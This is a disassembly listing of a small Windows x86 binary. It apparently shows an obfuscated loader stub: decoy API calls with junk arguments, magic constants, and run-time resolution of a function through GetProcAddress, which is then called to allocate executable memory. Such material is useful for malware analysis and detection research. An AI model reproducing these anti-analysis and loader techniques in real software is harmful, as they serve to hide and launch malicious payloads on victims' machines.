0x00401000:	pushl	%ebp	; from: 0x00401403(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -32(%ebp)
0x0040100e:	movl	$0x0, -28(%ebp)
0x00401015:	movl	$0x0, -72(%ebp)
0x0040101c:	movl	$0x0, -112(%ebp)
0x00401023:	movl	$0x0, -60(%ebp)
0x0040102a:	movl	$0x0, -68(%ebp)
0x00401031:	movl	$0x0, -16(%ebp)
0x00401038:	movl	$0x0, -56(%ebp)
0x0040103f:	movl	$0x0, -24(%ebp)
0x00401046:	movl	$0x0, -108(%ebp)
0x0040104d:	movl	$0x0, -80(%ebp)
0x00401054:	movl	$0x0, -20(%ebp)
0x0040105b:	movl	$0x0, -64(%ebp)
0x00401062:	movl	$0x0, -8(%ebp)
0x00401069:	movl	$0x0, -104(%ebp)
0x00401070:	movl	$0x0, -76(%ebp)
0x00401077:	movl	$0x0, -4(%ebp)
0x0040107e:	movl	$0x0, -12(%ebp)
0x00401085:	movl	0x00459744, %eax
0x0040108a:	movl	%eax, -100(%ebp)
0x0040108d:	movl	0x00459748, %ecx
0x00401093:	movl	%ecx, -96(%ebp)
0x00401096:	movl	0x0045974c, %edx
0x0040109c:	movl	%edx, -92(%ebp)
0x0040109f:	movb	0x00459750, %al
0x004010a4:	movb	%al, -88(%ebp)
0x004010a7:	movl	0x00459754, %ecx
0x004010ad:	movl	%ecx, -48(%ebp)
0x004010b0:	movl	0x00459758, %edx
0x004010b6:	movl	%edx, -44(%ebp)
0x004010b9:	movl	0x0045975c, %eax
0x004010be:	movl	%eax, -40(%ebp)
0x004010c1:	movw	0x00459760, %cx
0x004010c8:	movw	%cx, -36(%ebp)
0x004010cc:	movb	0x00459762, %dl
0x004010d2:	movb	%dl, -34(%ebp)
0x004010d5:	movl	$0x40, -28(%ebp)
0x004010dc:	leal	-28(%ebp), %eax
0x004010df:	pushl	%eax
0x004010e0:	leal	-12(%ebp), %ecx
0x004010e3:	pushl	%ecx
0x004010e4:	pushl	$0x4
0x004010e6:	call	CopySid@advapi32.dll	; targets: 0xff000090(MAY)
0x004010ec:	testl	%eax, %eax
0x004010ee:	je	0x00401100	; targets: 0x00401100(MAY), 0x004010f0(MAY)
0x004010f0:	pushl	$0x3	; from: 0x004010ee(MAY)
0x004010f2:	pushl	$0x0
0x004010f4:	pushl	$0x2
0x004010f6:	pushl	$0x1
0x004010f8:	pushl	$0x0
0x004010fa:	call	AddAce@advapi32.dll	; targets: 0xff000130(MAY)
0x00401100:	call	GetLastError@kernel32.dll	; targets: 0xff000070(MAY)	; from: 0x004010ee(MAY)
0x00401106:	movl	%eax, -32(%ebp)
0x00401109:	movzwl	-32(%ebp), %edx
0x0040110d:	cmpl	$0x7a, %edx
0x00401110:	jne	0x00401143	; targets: 0x00401143(MAY), 0x00401112(MAY)
0x00401112:	movl	$0xe0d, -20(%ebp)	; from: 0x00401110(MAY)
0x00401119:	movl	$0x3a, -68(%ebp)
0x00401120:	movb	$0x0, -36(%ebp)
0x00401124:	movl	$0x69091d56, -8(%ebp)
0x0040112b:	movl	-80(%ebp), %eax
0x0040112e:	pushl	%eax
0x0040112f:	pushl	$0x0
0x00401131:	movl	-112(%ebp), %ecx
0x00401134:	pushl	%ecx
0x00401135:	call	0x0040151e	; targets: 0x0040151e(MAY)
0x0040113a:	movl	$0xdceaf, -108(%ebp)
0x00401141:	jmp	0x00401166	; targets: 0x00401166(MAY)
0x00401143:	movb	$0x0, 0x00402088	; from: 0x00401110(MAY)
0x0040114a:	pushl	$0x405ab8
0x0040114f:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00401155:	movl	%eax, -32(%ebp)
0x00401158:	pushl	$0x402088
0x0040115d:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00401163:	movl	%eax, -32(%ebp)
0x00401166:	pushl	$0x459764	; from: 0x00401141(MAY)
0x0040116b:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff0000d0(MAY)
0x00401171:	movl	%eax, -80(%ebp)
0x00401174:	leal	-48(%ebp), %edx
0x00401177:	pushl	%edx
0x00401178:	movl	-80(%ebp), %eax
0x0040117b:	pushl	%eax
0x0040117c:	call	GetProcAddress@kernel32.dll	; targets: 0xff0000a0(MAY)
0x00401182:	movl	%eax, -52(%ebp)
0x00401185:	pushl	-28(%ebp)
0x00401188:	pushl	$0x1000
0x0040118d:	movl	-20(%ebp), %eax
0x00401190:	addl	$0x46, %eax
0x00401193:	pushl	%eax
0x00401194:	pushl	$0x0
0x00401196:	movl	-52(%ebp), %ebx
0x00401199:	call	%ebx	; targets: unresolved

start:
0x0040128c:	pushl	%ebp
0x0040128d:	movl	%esp, %ebp
0x0040128f:	subl	$0x54, %esp
0x00401292:	movl	$0x0, -52(%ebp)
0x00401299:	movl	$0x0, -80(%ebp)
0x004012a0:	movl	$0x0, -60(%ebp)
0x004012a7:	movl	$0x0, -48(%ebp)
0x004012ae:	movl	$0x0, -4(%ebp)
0x004012b5:	pushl	$0x66
0x004012b7:	pushl	$0x0
0x004012b9:	call	LoadIconA@user32.dll	; targets: 0xff0000b0(MAY)
0x004012bf:	movl	-60(%ebp), %eax
0x004012c2:	pushl	%eax
0x004012c3:	call	ReleaseMutex@kernel32.dll	; targets: 0xff000050(MAY)
0x004012c9:	leal	-76(%ebp), %ecx
0x004012cc:	pushl	%ecx
0x004012cd:	call	GetSystemTime@kernel32.dll	; targets: 0xff000140(MAY)
0x004012d3:	call	GetLastError@kernel32.dll	; targets: 0xff000070(MAY)
0x004012d9:	movl	%eax, -48(%ebp)
0x004012dc:	pushl	$0x8
0x004012de:	leal	-44(%ebp), %edx
0x004012e1:	pushl	%edx
0x004012e2:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff000150(MAY)
0x004012e8:	pushl	$0x0
0x004012ea:	call	IsWindowVisible@user32.dll	; targets: 0xff000040(MAY)
0x004012f0:	movl	-52(%ebp), %eax
0x004012f3:	pushl	%eax
0x004012f4:	call	0x00401354	; targets: 0x00401354(MAY)
0x00401354:	pushl	%ebp	; from: 0x004012f4(MAY)
0x00401355:	movl	%esp, %ebp
0x00401357:	subl	$0x3c, %esp
0x0040135a:	pushl	%esi
0x0040135b:	movl	$0x0, -28(%ebp)
0x00401362:	movl	$0x0, -60(%ebp)
0x00401369:	movl	$0x0, -56(%ebp)
0x00401370:	movl	$0x0, -36(%ebp)
0x00401377:	movl	$0x0, -48(%ebp)
0x0040137e:	movl	$0x0, -40(%ebp)
0x00401385:	movl	$0x459774, -44(%ebp)
0x0040138c:	movl	$0x98c73ffa, -36(%ebp)
0x00401393:	movl	$0x0, -52(%ebp)
0x0040139a:	movl	-36(%ebp), %eax
0x0040139d:	movl	%eax, -32(%ebp)
0x004013a0:	movl	GetLastError@kernel32.dll, %ecx
0x004013a6:	movl	%ecx, -4(%ebp)
0x004013a9:	movl	-48(%ebp), %edx
0x004013ac:	pushl	%edx
0x004013ad:	call	FindClose@kernel32.dll	; targets: 0xff0000c0(MAY)
0x004013b3:	cmpl	$0x0, -32(%ebp)
0x004013b7:	je	0x004013bf	; targets: 0x004013b9(MAY)
0x004013b9:	cmpl	$0x0, -4(%ebp)	; from: 0x004013b7(MAY)
0x004013bd:	jne	0x004013ce	; targets: 0x004013ce(MAY)
0x004013ce:	pushl	$0xa	; from: 0x004013bd(MAY)
0x004013d0:	call	Sleep@kernel32.dll	; targets: 0xff000030(MAY)
0x004013d6:	pushl	$0x8000
0x004013db:	pushl	$0x0
0x004013dd:	movl	-60(%ebp), %edx
0x004013e0:	pushl	%edx
0x004013e1:	pushl	$0xffffffff
0x004013e3:	call	VirtualFreeEx@kernel32.dll	; targets: 0xff000020(MAY)
0x004013e9:	testl	%eax, %eax
0x004013eb:	je	0x004013f7	; targets: 0x004013f7(MAY), 0x004013ed(MAY)
0x004013ed:	movl	-48(%ebp), %eax	; from: 0x004013eb(MAY)
0x004013f0:	pushl	%eax
0x004013f1:	call	HeapDestroy@kernel32.dll	; targets: 0xff000120(MAY)
0x004013f7:	movl	-4(%ebp), %esi	; from: 0x004013eb(MAY)
0x004013fa:	call	%esi	; targets: 0xff000070(MAY)
0x004013fc:	movl	%eax, -60(%ebp)
0x004013ff:	movl	-32(%ebp), %ecx
0x00401402:	pushl	%ecx
0x00401403:	call	0x00401000	; targets: 0x00401000(MAY)
0x0040151e:	jmp	GetWsChanges@psapi.dll	; targets: 0xff000160(MAY)	; from: 0x00401135(MAY)
